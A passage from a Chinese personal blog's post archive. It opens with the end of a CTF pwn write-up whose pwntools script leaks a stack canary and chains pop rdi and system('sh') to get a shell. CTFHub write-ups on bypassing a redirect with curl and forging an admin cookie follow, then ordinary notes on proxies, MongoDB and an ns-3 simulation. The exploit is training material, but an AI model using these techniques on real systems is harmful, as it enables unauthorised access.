                     data-src="https://image.txgde.space/2022/02/image-20220218180221472.png"
                      alt="image-20220218180221472"
                ></p>
<p>在0x400963处发现<code>pop rdi</code>命令</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>python代码如下:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = process(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line"><span class="comment">#f=remote(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">f.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">568</span>+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">f.recvuntil(<span class="string">b&#x27;aaab&#x27;</span>)</span><br><span class="line">canary = f.recv(<span class="number">7</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\0&#x27;</span>+canary</span><br><span class="line"></span><br><span class="line">sh_address = <span class="number">0x601068</span></span><br><span class="line">system_address  = <span class="number">0x40080c</span></span><br><span class="line">poprdi_address = <span class="number">0x400963</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">520</span> + canary + p64(<span class="number">0</span>) + p64(poprdi_address) + p64(sh_address) + p64(system_address)</span><br><span class="line"></span><br><span class="line">f.send(payload)</span><br><span class="line">f.interactive()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Bugku</tag>
        <tag>Canary</tag>
        <tag>Easy</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>[CTFHub]302跳转</title>
    <url>/2021/09/13/ctfhub302%E8%B7%B3%E8%BD%AC/</url>
    <content><![CDATA[<h2 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h2><p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >CTFHub&gt;&gt;技能树&gt;&gt;Web&gt;&gt;Web前置技能&gt;&gt;HTTP协议&gt;&gt;302跳转 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>302重定向又称之为暂时性转移(Temporarily Moved )，英文名称：302 redirect。 也被认为是暂时重定向（temporary redirect），一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页经历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。 ——百度百科</p>
<h2 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>创建环境后打开链接,如图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/09/1631520377-image.png"
                      alt="1631520377-image"
                ></p>
<p>首页(xxx&#x2F;index.html)写着 <strong>No Flag here</strong> ,接着我们打开审查元素(F12)看看点击 <strong>Give me Flag</strong>(xxx&#x2F;index.php) 链接会发生什么.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/09/1631520681-image.png"
                      alt="1631520681-image"
                ></p>
<p>发现当我们点击 <strong>Give me Flag</strong>(xxx&#x2F;index.php) 时,页面又302重定向到index.html了.</p>
<p>因此猜测,只要我们阻止index.php重定向到index.html就可以拿到Flag了</p>
<p>这里我们利用curl默认不跟随重定向的特点来访问index.php</p>
<p>打开终端,输入<code>curl http://challenge-1cf1be6da3e0df53.sandbox.ctfhub.com:10800/index.php</code> (网址根据自身情况输入)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/09/1631520277-image.png"
                      alt="1631520277-image"
                ></p>
<p>成功拿到Flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>Easy</tag>
        <tag>Writeup</tag>
        <tag>CTFHub</tag>
      </tags>
  </entry>
  <entry>
    <title>[CTFHub]Cookie</title>
    <url>/2021/09/18/ctfhubcookie/</url>
    <content><![CDATA[<h2 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h2><p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >CTFHub&gt;&gt;技能树&gt;&gt;Web&gt;&gt;Web前置技能&gt;&gt;HTTP协议&gt;&gt;Cookie <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息. ——百度百科</p>
<h2 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h2><p>创建环境后打开链接,如图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/09/image-4-1024x286.png"
                      alt="image-4-1024x286"
                ></p>
<p>网站提示”hello guest, only admin can get flag”,即只有admin才能获得flag.</p>
<p>根据本体题目可以看出应该跟cookie有关,打开审查元素-Application(应用程序)-Storage(储存)查看cookie,如图:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/09/image-5-1024x516.png"
                      alt="image-5-1024x516"
                ></p>
<p>可以看到cookie里有admin的字样,后面有个值为0的value,猜测将value的值修改为1即可伪造admin的身份拿到flag</p>
<p>双击修改value值为1并刷新网页:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/09/image-6-1024x633.png"
                      alt="image-6-1024x633"
                ></p>
<p>成功拿到Flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>Easy</tag>
        <tag>Writeup</tag>
        <tag>CTFHub</tag>
      </tags>
  </entry>
  <entry>
    <title>[CTFHub]xxx</title>
    <url>/2021/09/18/ctfhubxxx/</url>
    <content><![CDATA[<h2 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h2><p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >CTFHub&gt;&gt;技能树&gt;&gt;Web&gt;&gt;Web前置技能&gt;&gt;HTTP协议&gt;&gt;Cookie <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息. ——百度百科</p>
<h2 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h2>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Hello, world!</title>
    <url>/2021/09/09/hello-world/</url>
    <content><![CDATA[<p>我的博客建成啦!!</p>
<p>交换友链可以按以下格式给我发邮件(<a class="link"   href="mailto:tongxuguang23@icloud.com" >tongxuguang23@icloud.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)哦^ ^:</p>
<p><strong>博客名:</strong> 这是名<br><strong>链接:</strong> <a class="link"   href="https://xxxx.xxx/" >https://xxxx.xxx <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
      <tags>
        <tag>友链</tag>
        <tag>瞎bb</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统下进行代理的方法</title>
    <url>/2022/02/10/linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>有代理的需求的时候，Windows和Mac系统还好，Linux会有些麻烦。每次在网上搜就会浪费很多时间,因此在此记录一下Linux系统下进行代理的方法。</p>
<h2 id="获取代理地址"><a href="#获取代理地址" class="headerlink" title="获取代理地址"></a>获取代理地址</h2><p>注:<br><strong>本文主要针对我已经有一台Windows主机开启Clash并允许lan的情况，并根据我自身的需求慢慢更新，地址请根据自身情况填写</strong></p>
<p>clash配置如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/image-20220210151221245.png"
                      alt="image-20220210151221245"
                ></p>
<p>开启Allow LAN，端口为7890</p>
<h3 id="clash运行在本地"><a href="#clash运行在本地" class="headerlink" title="clash运行在本地"></a>clash运行在本地</h3><p>那么代理地址就为<code>http://127.0.0.1:7890</code></p>
<h3 id="clash运行在宿主机，虚拟机需要代理"><a href="#clash运行在宿主机，虚拟机需要代理" class="headerlink" title="clash运行在宿主机，虚拟机需要代理"></a>clash运行在宿主机，虚拟机需要代理</h3><p>可以通过命令行等获取到宿主机的ip地址，windows下使用<code>ipconfig</code>，如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2022/02/image-20220210152155150.png"
                      alt="image-20220210152155150"
                ></p>
<p>这里我们找到与虚拟机为同一个以太网适配器的IP地址，我这台的为<code>192.168.121.1</code>,那么虚拟机内所需要的代理地址为<code>http://192.168.121.1:7890</code></p>
<h3 id="clash运行在其他主机上"><a href="#clash运行在其他主机上" class="headerlink" title="clash运行在其他主机上"></a>clash运行在其他主机上</h3><p>运行clash的主机需要能够被访问到(在同一个局域网内或者有外网ip)，代理地址为<code>http://ip:7890</code>(根据自身情况填写)</p>
<h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>代理地址写进环境变量后可以更方便地调用</p>
<h2 id="终端代理"><a href="#终端代理" class="headerlink" title="终端代理"></a>终端代理</h2><p>终端输入以下命令</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=&quot;http://127.0.0.1:7890&quot;  </span><br><span class="line">export https_proxy=&quot;http://127.0.0.1:7890&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>curl</strong>等命令会用到</p>
<h2 id="浏览器代理"><a href="#浏览器代理" class="headerlink" title="浏览器代理"></a>浏览器代理</h2><h3 id="Firefox浏览器"><a href="#Firefox浏览器" class="headerlink" title="Firefox浏览器"></a>Firefox浏览器</h3><p>Firefox浏览器可在设置里边直接打开代理选项进行手动代理配置即可</p>
<h3 id="Chrome浏览器"><a href="#Chrome浏览器" class="headerlink" title="Chrome浏览器"></a>Chrome浏览器</h3><p>Chrome浏览器设置中没有图形化代理选项，但是可以通过终端命令的方式来以代理模式打开Chrome浏览器:</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">google-chrome --proxy-server=&quot;socks://127.0.0.1:7890&quot;</span><br></pre></td></tr></table></figure></div>

<p>出现下列错误的原因可能是clash主机节点出现问题</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[118605:118619:0210/012450.301746:ERROR:ssl_client_socket_impl.cc(995)] handshake failed; returned -1, SSL error code 1, net_error -101  </span><br><span class="line">[118605:118619:0210/012454.059174:ERROR:ssl_client_socket_impl.cc(995)] handshake failed; returned -1, SSL error code 1, net_error -101  </span><br><span class="line">[118605:118619:0210/012456.287762:ERROR:ssl_client_socket_impl.cc(995)] handshake failed; returned -1, SSL error code 1, net_error -101  </span><br><span class="line">[118605:118619:0210/012501.474005:ERROR:ssl_client_socket_impl.cc(995)] handshake failed; returned -1, SSL error code 1, net_error -101  </span><br><span class="line">[118605:118619:0210/012503.692347:ERROR:ssl_client_socket_impl.cc(995)] handshake failed; returned -1, SSL error code 1, net_error -101  </span><br><span class="line">[118605:118619:0210/012509.300136:ERROR:ssl_client_socket_impl.cc(995)] handshake failed; returned -1, SSL error code 1, net_error -101  </span><br><span class="line">​</span><br></pre></td></tr></table></figure></div>

<h2 id="pip代理"><a href="#pip代理" class="headerlink" title="pip代理"></a>pip代理</h2><p>临时使用pip代理可以使用以下命令</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pip install xxxx --proxy=&quot;socks://127.0.0.1:7890&quot;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>clash</tag>
        <tag>kali</tag>
        <tag>linux</tag>
        <tag>pip代理</tag>
        <tag>代理</tag>
        <tag>未分类</tag>
        <tag>浏览器代理</tag>
      </tags>
  </entry>
  <entry>
    <title>【学习笔记】MongoDB笔记</title>
    <url>/2022/10/17/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91MongoDB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="MacOS-命令"><a href="#MacOS-命令" class="headerlink" title="MacOS 命令"></a>MacOS 命令</h2><p>开启mongodb Server</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">brew services start mongodb-community@6.0</span><br></pre></td></tr></table></figure></div>
<p>关闭mongodb Server</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">brew services stop mongodb-community@6.0</span><br></pre></td></tr></table></figure></div>



<h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><p>mongoDB对某一个数据库进行操作需要先创建一个对该数据库有相关权限的用户<br>首先打开某一个数据库<code>use dbname</code><br>输入<code>db.createUser(&#123;user:&#39;username&#39;,pwd:&#39;password&#39;,roles:[&#123;role:&#39;dbOwner&#39;,db:&#39;dbname&#39;&#125;,&#123;role:&#39;dbOwner&#39;,db:&#39;dbname&#39;&#125;]&#125;)</code></p>
<h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><h3 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h3><p><code>show databases</code></p>
<h3 id="查看有哪些表-集合"><a href="#查看有哪些表-集合" class="headerlink" title="查看有哪些表&#x2F;集合"></a>查看有哪些表&#x2F;集合</h3><p><code>show tables/show collections</code></p>
<h3 id="查看某一表中的全部内容"><a href="#查看某一表中的全部内容" class="headerlink" title="查看某一表中的全部内容"></a>查看某一表中的全部内容</h3><p><code>db.table_name.find()</code></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>【学习笔记】ns3 Aqua-sim-tg例程broadcastMAC_example的理解</title>
    <url>/2023/10/23/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91ns3%20Aqua-sim-tg%E4%BE%8B%E7%A8%8BbroadcastMAC_example%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ns3/core-module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ns3/network-module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ns3/mobility-module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ns3/aqua-sim-tg-module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ns3/applications-module.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ns3/log.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ns3/callback.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * BroadCastMAC</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * String topology:</span></span><br><span class="line"><span class="comment"> * N ----&gt;  N  -----&gt; N -----&gt; N* -----&gt; S</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> ns3;</span><br><span class="line"></span><br><span class="line"><span class="built_in">NS_LOG_COMPONENT_DEFINE</span>(<span class="string">&quot;ASBroadcastMac&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">double</span> simStop = <span class="number">2</span>; <span class="comment">//seconds</span></span><br><span class="line">  <span class="type">int</span> nodes = <span class="number">3</span>;</span><br><span class="line">  <span class="type">int</span> sinks = <span class="number">1</span>;</span><br><span class="line">  <span class="type">uint32_t</span> m_dataRate = <span class="number">128</span>;</span><br><span class="line">  <span class="type">uint32_t</span> m_packetSize = <span class="number">40</span>;</span><br><span class="line">  <span class="comment">//double range = 20;</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">LogComponentEnable</span> (<span class="string">&quot;ASBroadcastMac&quot;</span>, LOG_LEVEL_INFO);<span class="comment">//日志</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//to change on the fly</span></span><br><span class="line">  <span class="comment">//shell 参数</span></span><br><span class="line">  CommandLine cmd;</span><br><span class="line">  cmd.<span class="built_in">AddValue</span> (<span class="string">&quot;simStop&quot;</span>, <span class="string">&quot;Length of simulation&quot;</span>, simStop);</span><br><span class="line">  cmd.<span class="built_in">AddValue</span> (<span class="string">&quot;nodes&quot;</span>, <span class="string">&quot;Amount of regular underwater nodes&quot;</span>, nodes);</span><br><span class="line">  cmd.<span class="built_in">AddValue</span> (<span class="string">&quot;sinks&quot;</span>, <span class="string">&quot;Amount of underwater sinks&quot;</span>, sinks);</span><br><span class="line">  cmd.<span class="built_in">Parse</span>(argc,argv);</span><br><span class="line"></span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;-----------Initializing simulation-----------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">  NodeContainer nodesCon;<span class="comment">//普通节点容器</span></span><br><span class="line">  NodeContainer sinksCon;<span class="comment">//水下节点容器</span></span><br><span class="line">  <span class="built_in">NS_LOG_DEBUG</span>(<span class="string">&quot;创建普通节点容器&quot;</span>);</span><br><span class="line">  nodesCon.<span class="built_in">Create</span>(nodes);<span class="comment">//创建</span></span><br><span class="line">  <span class="built_in">NS_LOG_DEBUG</span>(<span class="string">&quot;创建水下节点容器&quot;</span>);</span><br><span class="line">  sinksCon.<span class="built_in">Create</span>(sinks);</span><br><span class="line"></span><br><span class="line">  PacketSocketHelper socketHelper;<span class="comment">//Packet套接字？？(链路层)</span></span><br><span class="line">  socketHelper.<span class="built_in">Install</span>(nodesCon); <span class="comment">//安装到节点上</span></span><br><span class="line">  socketHelper.<span class="built_in">Install</span>(sinksCon);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//establish layers using helper&#x27;s pre-build settings</span></span><br><span class="line">  AquaSimChannelHelper channel = AquaSimChannelHelper::<span class="built_in">Default</span>();<span class="comment">//默认通道配置</span></span><br><span class="line">  <span class="comment">//channel.SetPropagation(&quot;ns3::AquaSimRangePropagation&quot;);</span></span><br><span class="line">  AquaSimHelper asHelper = AquaSimHelper::<span class="built_in">Default</span>(); <span class="comment">//配置网络层</span></span><br><span class="line">  asHelper.<span class="built_in">SetChannel</span>(channel.<span class="built_in">Create</span>());<span class="comment">//创建通道</span></span><br><span class="line">  asHelper.<span class="built_in">SetMac</span>(<span class="string">&quot;ns3::AquaSimBroadcastMac&quot;</span>);<span class="comment">//创建 Mac 地址</span></span><br><span class="line">  asHelper.<span class="built_in">SetRouting</span>(<span class="string">&quot;ns3::AquaSimStaticRouting&quot;</span>);<span class="comment">//设置静态路由</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Set up mobility model for nodes and sinks</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  MobilityHelper mobility; <span class="comment">//移动模型</span></span><br><span class="line">  NetDeviceContainer devices; <span class="comment">//网络设备容器</span></span><br><span class="line">  Ptr&lt;ListPositionAllocator&gt; position = <span class="built_in">CreateObject</span>&lt;ListPositionAllocator&gt; (); <span class="comment">//节点位置信息类指针</span></span><br><span class="line">  Vector boundry = <span class="built_in">Vector</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>); <span class="comment">//设置一个位置起始向量</span></span><br><span class="line"></span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Creating Nodes\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (NodeContainer::Iterator i = nodesCon.<span class="built_in">Begin</span>(); i != nodesCon.<span class="built_in">End</span>(); i++)</span><br><span class="line">    &#123;<span class="comment">//对每一个普通节点</span></span><br><span class="line">      Ptr&lt;AquaSimNetDevice&gt; newDevice = <span class="built_in">CreateObject</span>&lt;AquaSimNetDevice&gt;();<span class="comment">//创建一个新网络设备</span></span><br><span class="line">      position-&gt;<span class="built_in">Add</span>(boundry);<span class="comment">//将当前boundry添加到位置中</span></span><br><span class="line">      devices.<span class="built_in">Add</span>(asHelper.<span class="built_in">Create</span>(*i, newDevice));</span><br><span class="line">      <span class="comment">//asHelper.Create(*i, newDevice) 在 i 的节点上创建新的网络设备</span></span><br><span class="line">      <span class="comment">//并将该网络设备添加到设备容器中</span></span><br><span class="line">      <span class="built_in">NS_LOG_DEBUG</span>(<span class="string">&quot;Node:&quot;</span> &lt;&lt; newDevice-&gt;<span class="built_in">GetAddress</span>() &lt;&lt; <span class="string">&quot; position(x):&quot;</span> &lt;&lt; boundry.x);</span><br><span class="line">      boundry.x += <span class="number">100</span>;<span class="comment">//boundry x 轴坐标+100</span></span><br><span class="line">      <span class="comment">//newDevice-&gt;GetPhy()-&gt;SetTransRange(range);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (NodeContainer::Iterator i = sinksCon.<span class="built_in">Begin</span>(); i != sinksCon.<span class="built_in">End</span>(); i++)</span><br><span class="line">    &#123;<span class="comment">//水下节点，同以上普通节点</span></span><br><span class="line">      Ptr&lt;AquaSimNetDevice&gt; newDevice = <span class="built_in">CreateObject</span>&lt;AquaSimNetDevice&gt;();</span><br><span class="line">      position-&gt;<span class="built_in">Add</span>(boundry);</span><br><span class="line">      devices.<span class="built_in">Add</span>(asHelper.<span class="built_in">Create</span>(*i, newDevice));</span><br><span class="line"></span><br><span class="line">      <span class="built_in">NS_LOG_DEBUG</span>(<span class="string">&quot;Sink:&quot;</span> &lt;&lt; newDevice-&gt;<span class="built_in">GetAddress</span>() &lt;&lt; <span class="string">&quot; position(x):&quot;</span> &lt;&lt; boundry.x);</span><br><span class="line">      boundry.x += <span class="number">100</span>;</span><br><span class="line">      <span class="comment">//newDevice-&gt;GetPhy()-&gt;SetTransRange(range);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  mobility.<span class="built_in">SetPositionAllocator</span>(position);<span class="comment">//为移动设备分配位置信息？？</span></span><br><span class="line">  mobility.<span class="built_in">SetMobilityModel</span>(<span class="string">&quot;ns3::ConstantPositionMobilityModel&quot;</span>);<span class="comment">//移动模型为固定位置移动模型</span></span><br><span class="line">  mobility.<span class="built_in">Install</span>(nodesCon);<span class="comment">//将位置模型安装到普通和水下节点</span></span><br><span class="line">  mobility.<span class="built_in">Install</span>(sinksCon);</span><br><span class="line"></span><br><span class="line">  PacketSocketAddress socket; <span class="comment">//定义 Packet 套接字地址</span></span><br><span class="line">  <span class="comment">//链路层套接字PacketSocketAddress（协议号+NetDevice标识+MAC地址)</span></span><br><span class="line">  socket.<span class="built_in">SetAllDevices</span>();</span><br><span class="line">  socket.<span class="built_in">SetPhysicalAddress</span> (devices.<span class="built_in">Get</span>(nodes)-&gt;<span class="built_in">GetAddress</span>()); <span class="comment">//Set dest to first sink (nodes+1 device)</span></span><br><span class="line">  socket.<span class="built_in">SetProtocol</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="function">OnOffNdHelper <span class="title">app</span> <span class="params">(<span class="string">&quot;ns3::PacketSocketFactory&quot;</span>, Address (socket))</span></span>;<span class="comment">//设置 OnOff 应用程序用来周期性发送数据</span></span><br><span class="line">  app.<span class="built_in">SetAttribute</span> (<span class="string">&quot;OnTime&quot;</span>, <span class="built_in">StringValue</span> (<span class="string">&quot;ns3::ConstantRandomVariable[Constant=1]&quot;</span>));</span><br><span class="line">  app.<span class="built_in">SetAttribute</span> (<span class="string">&quot;OffTime&quot;</span>, <span class="built_in">StringValue</span> (<span class="string">&quot;ns3::ConstantRandomVariable[Constant=0]&quot;</span>));</span><br><span class="line">  app.<span class="built_in">SetAttribute</span> (<span class="string">&quot;DataRate&quot;</span>, <span class="built_in">DataRateValue</span> (m_dataRate));</span><br><span class="line">  app.<span class="built_in">SetAttribute</span> (<span class="string">&quot;PacketSize&quot;</span>, <span class="built_in">UintegerValue</span> (m_packetSize));</span><br><span class="line"></span><br><span class="line">  ApplicationContainer apps = app.<span class="built_in">Install</span> (nodesCon);<span class="comment">//app 容器</span></span><br><span class="line">  apps.<span class="built_in">Start</span> (<span class="built_in">Seconds</span> (<span class="number">0.5</span>));</span><br><span class="line">  apps.<span class="built_in">Stop</span> (<span class="built_in">Seconds</span> (simStop + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Ptr&lt;Node&gt; sinkNode = sinksCon.<span class="built_in">Get</span>(<span class="number">0</span>);<span class="comment">//获得 sinkNode</span></span><br><span class="line">  TypeId psfid = TypeId::<span class="built_in">LookupByName</span> (<span class="string">&quot;ns3::PacketSocketFactory&quot;</span>);<span class="comment">//使用Packet套接字，并获取的该类型的 id</span></span><br><span class="line"></span><br><span class="line">  Ptr&lt;Socket&gt; sinkSocket = Socket::<span class="built_in">CreateSocket</span> (sinkNode, psfid);<span class="comment">//创建 sinkNode 的 Socket</span></span><br><span class="line">  sinkSocket-&gt;<span class="built_in">Bind</span> (socket);<span class="comment">//将 sinkNode 的套接字与 Node 的套接字绑定进行通信</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  For channel trace driven simulation</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  AquaSimTraceReader tReader;</span></span><br><span class="line"><span class="comment">  tReader.SetChannel(asHelper.GetChannel());</span></span><br><span class="line"><span class="comment">  if (tReader.ReadFile(&quot;channelTrace.txt&quot;)) NS_LOG_DEBUG(&quot;Trace Reader Success&quot;);</span></span><br><span class="line"><span class="comment">  else NS_LOG_DEBUG(&quot;Trace Reader Failure&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  Packet::<span class="built_in">EnablePrinting</span> (); <span class="comment">//for debugging purposes</span></span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;-----------Running Simulation-----------\n&quot;</span>;</span><br><span class="line">  Simulator::<span class="built_in">Stop</span>(<span class="built_in">Seconds</span>(simStop));</span><br><span class="line">  Simulator::<span class="built_in">Run</span>();</span><br><span class="line">  Simulator::<span class="built_in">Destroy</span>();</span><br><span class="line"></span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;fin.\n&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>设定日志</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">export NS_LOG=PacketSocket=level_all:AquaSimBroadcastMac=level_all:Node=level_all</span><br></pre></td></tr></table></figure></div>
<p>运行命令</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./waf --run &quot;src/aqua-sim-tg/examples/broadcastMAC_example&quot;</span><br></pre></td></tr></table></figure></div>
<p>运行日志</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line">-----------<span class="title class_">Initializing</span> simulation-----------</span><br><span class="line">创建普通节点容器</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">Node</span>(<span class="number">0x556037450b30</span>) <span class="comment">//3 个普通节点编号</span></span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">Construct</span>(<span class="number">0x556037450b30</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">Node</span>(<span class="number">0x55603749aad0</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">Construct</span>(<span class="number">0x55603749aad0</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">Node</span>(<span class="number">0x556037496b40</span>)</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">Construct</span>(<span class="number">0x556037496b40</span>)</span><br><span class="line">创建水下节点容器</span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">Node</span>(<span class="number">0x556037496c30</span>) <span class="comment">//水下节点编号</span></span><br><span class="line"><span class="title class_">Node</span>:<span class="title class_">Construct</span>(<span 